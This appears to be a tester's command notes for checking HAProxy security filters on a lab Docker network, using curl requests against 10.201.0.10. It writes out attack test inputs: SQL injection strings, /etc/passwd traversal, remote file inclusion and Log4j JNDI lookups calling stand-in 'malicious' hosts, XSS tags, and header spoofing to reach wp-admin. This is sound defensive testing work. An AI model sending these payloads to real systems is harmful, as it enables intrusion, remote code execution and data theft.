docker run --rm -it \
    --network docker_haproxy \
    --ip 10.201.0.51 \
    --name nettest jonlabelle/network-tools

# 01 sql injextion
    #SQL Injection via Query Parameter: Tests whether the application is vulnerable to SQL injection by manipulating the query string to always return true (1=1).
    curl "http://10.201.0.10/?id=1'%20OR%201=1--"
    #SQL Injection in Headers: Tests the server's response to SQL injection attempts in a custom header.
    curl -H "X-Test-Header: 1' OR 1=1--" http://10.201.0.10
    #Normal Header: A standard request to compare against the SQL injection test.
    curl -H "X-Test-Header: asd" http://10.201.0.10
    #SQL Injection via POST Data: Tests SQL injection through a POST request payload.
    curl -X POST -d "username=admin' OR 1=1--" http://10.201.0.10/

# 02 custom error page
    #Testing Custom Error Handling: Requests a non-existent page to check how the application handles 404 errors and if it serves a custom error page.
    curl 10.201.0.10/Nothing/

# 03 rate limit
    #Rate Limiting Test: Sends multiple requests in a loop to test if the application enforces rate limiting and responds appropriately after a threshold.
    for i in {1..150}; do curl -I http://10.201.0.10; done

# 04 port routing
    #Port Routing Check: Tests the routing of requests to specific ports, useful for confirming that the server is configured to handle traffic on these ports.
    curl http://10.201.0.10:15081
    curl http://10.201.0.10:15082

# 05 whitelist for path
    # maintenance
    #Access to Maintenance Page: Requests the root URL, potentially checking for a maintenance page.
    curl 10.201.0.10

    # whitelist to backend 1. strap foo from url
    #Whitelisted Backend Path: Tests access to a path that should be allowed through whitelisting.
    curl 10.201.0.10/foo/

    #backend 2
    #Another Backend Path: Tests access to another potentially whitelisted path.
    curl 10.201.0.10/bar/

# 06 x-forwardfor filter
    #Testing Forwarded IP Filtering: Tests if the application correctly handles and filters requests based on the X-Forwarded-For header.
    curl -H "X-Forwarded-For: 203.0.113.1" http://10.201.0.10
    #Another X-Forwarded-For Test: Checks handling of a different IP in the forwarded header.
    curl -H "X-Forwarded-For: 192.168.1.1" http://10.201.0.10

# 07 external auth
    #Test Access to User Details: Requests user details for a non-existent user to check authentication handling.
    curl http://10.201.0.10/user/asd/details
    #Test Access to Valid User: Similar request for a valid user to verify proper authentication.
    curl http://10.201.0.10/user/Joe/details

# 08 geo blocking
    #Geo-blocking Test: Tests if geo-blocking rules are enforced based on the IP in the X-Forwarded-For header.
    curl -H "X-Forwarded-For: 2.57.171.5" http://10.201.0.10

# 09 browser check
    #Testing Browser User Agent: Sends a request with a specific user-agent string to check browser-based filtering.
    #Different User-Agent Testing: These requests further check how the server handles various browser and unknown user agents.
    curl -A "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" \
    http://10.201.0.10/browser
    curl -A "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0" http://10.201.0.10/browser
    curl -A "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15" \
    http://10.201.0.10/browser
    curl -A "user-agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; AS; rv:11.0) like Gecko" http://10.201.0.10/browser
    curl -A "user-agent: UnknownBrowser/1.0" http://10.201.0.10/browser
    curl -A "" http://10.201.0.10/browser

# 10 coockie size
    #Standard Cookie Size Test: Sends a request with normal cookie values.
    curl -I -b "cookie1=value1; cookie2=value2" http://10.201.0.10/coockie
    #Exceeding Cookie Size: Tests if the application correctly handles oversized cookies by sending a cookie that exceeds typical size limits.
    curl -I -b "$(printf 'cookie1=%s;' $(head -c 4100 /dev/urandom | base64))" http://10.201.0.10/coockie
    #Standard Request: A general request to verify normal operation.
    curl -I http://10.201.0.10

# 11 lfi - not working, not commented
    curl -I http://10.201.0.10
    #Testing Local File Inclusion: Attempts to access the /etc/passwd file to check for LFI vulnerabilities. The following lines contain commented out or failed attempts.
    curl -I "http://10.201.0.10/../etc/passwd"
    curl -X POST http://10.201.0.10 -d "file=../etc/passwd"
    # curl -I "http://10.201.0.10/..%2f..%2fetc%2fpasswd"
    #Alternative LFI Attempts: Additional attempts to exploit LFI.
    curl -I "http://10.201.0.10/../php://"


# 12 rfi
    #Testing RFI via POST: Sends a basic POST request to the server.
    curl -X POST http://10.201.0.10 -d "param=value"
    #Testing RFI with Remote URL: Attempts to include a remote file from a malicious site.
    curl -X POST http://10.201.0.10 -d "file=http://malicious-site.com/malicious.php"
    #FTP RFI Attempt: Similar to the previous RFI test but uses FTP.
    curl -X POST http://10.201.0.10 -d "file=ftp://malicious-site.com/malicious.php"
    curl -X POST http://10.201.0.10 -d "file=somefile.php"
    #Testing with Other Inputs: Additional POST tests to see how the server handles various file inclusion attempts.
    curl -X POST http://10.201.0.10 -d "name=validRequest&param=normal"

# 13 xss
    curl -I -X GET http://10.201.0.10/normal-page
    #XSS Attempt with Script Tag: Tests for XSS vulnerabilities by injecting a script in a query parameter.
    curl -I -X GET "http://10.201.0.10/?param=<script>alert('XSS')</script>"
    #**XSS Attempt with JavaScript
    curl -I -X GET "http://10.201.0.10/?param=javascript:alert('XSS')"
    #Normal request
    curl -I -X GET "http://10.201.0.10/?param=normalValue"

# 14 admin path
    #Admin Path Access Test: Sends a request to the /admin path to check if access controls are correctly enforced for admin endpoints. A successful response may indicate improper protection.
    curl -I http://10.201.0.10/admin
    #WordPress Admin Path Check: Specifically tests access to the WordPress admin dashboard (/wp-admin). Similar to the previous test, this checks if the application restricts access appropriately.
    curl -I http://10.201.0.10/myweb/wp-admin
    #Normal Page Request: Sends a request to a regular page to establish a baseline response. This helps compare the behavior of the application when accessing admin vs. normal paths.
    curl -I http://10.201.0.10/normal-page
    #Admin Path Access with Forwarded IP: Tests access to the WordPress admin using a spoofed X-Forwarded-For header. This can help verify if the application relies on client IP filtering and whether such mechanisms can be bypassed.
    curl -I -H "X-Forwarded-For: 10.10.10.1" http://10.201.0.10/myweb/wp-admin

# 15 log4j
    #Normal Page Access for Log4j Test: Sends a request to a normal page to establish a control before testing Log4j vulnerabilities.
    curl -I http://10.201.0.10/normal-page
    #Testing Log4j Vulnerability via LDAP: This request simulates a malicious user agent string to check for vulnerabilities in Log4j. The presence of ${jndi:ldap://...} indicates an attempt to exploit remote code execution via LDAP lookups.
    curl -I -A 'user-agent: ${jndi:ldap://malicious.com/a}' http://10.201.0.10/normal-page
    #Testing Log4j Vulnerability via RMI: Similar to the previous test, but uses RMI (Remote Method Invocation) for exploitation. This checks if the application is susceptible to this method of attack.
    curl -I -A 'user-agent: ${jndi:rmi://malicious.com/a}' http://10.201.0.10/normal-page
    #Environment Variable Exploitation Attempt: This request attempts to access environment variables through the user agent to test for potential vulnerabilities. If the application logs this information improperly, it may expose sensitive data.
    curl -I -A 'user-agent: ${env:HOME}' http://10.201.0.10/normal-page

# 16 bot detection
    #Basic Request for Bot Detection: Sends a normal request to see how the application responds, establishing a baseline.
    curl -I http://10.201.0.10/
    #Testing Googlebot Detection: Specifically tests how the application handles requests from a well-known bot, Googlebot, to verify that it can distinguish between legitimate and illegitimate requests.
    curl -I -A "Googlebot" http://10.201.0.10/
    #Testing with a Standard User-Agent: Sends a request using a common browser user-agent to confirm the application’s ability to differentiate between bots and genuine traffic. This is particularly useful for ensuring that bot detection mechanisms work as intended.
    curl -A "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0" http://10.201.0.10/browser

# 17 slowloris
    #Initial Slowloris Request: A basic request to the application. This could be part of the Slowloris attack methodology, which involves sending multiple incomplete requests to exhaust server resources.
    curl -I http://10.201.0.10/
    #Secondary Slowloris Request: Another request sent to a specific endpoint (/silent-dro), likely to continue the Slowloris testing. This test is designed to assess the server’s resilience against slow, persistent requests aimed at causing denial of service (DoS).
    curl -I http://10.201.0.10/silent-dro

docker exec -it net-tools curl http://10.201.0.10/



jwt
    curl -H "Authorization: Bearer mytoken" http://10.201.0.10
    curl -H "Authorization: Bearer something_not_working" http://10.201.0.10

Circuit Breaker Pattern
    Test Case 1: Healthy Backend
    curl http://10.201.0.10/

    Test Case 2: Simulate Backend Failure
    curl http://10.201.0.10/some-failing-endpoint

    Test Case 3: Recovery after Circuit Breaker Trips
    curl http://10.201.0.10/    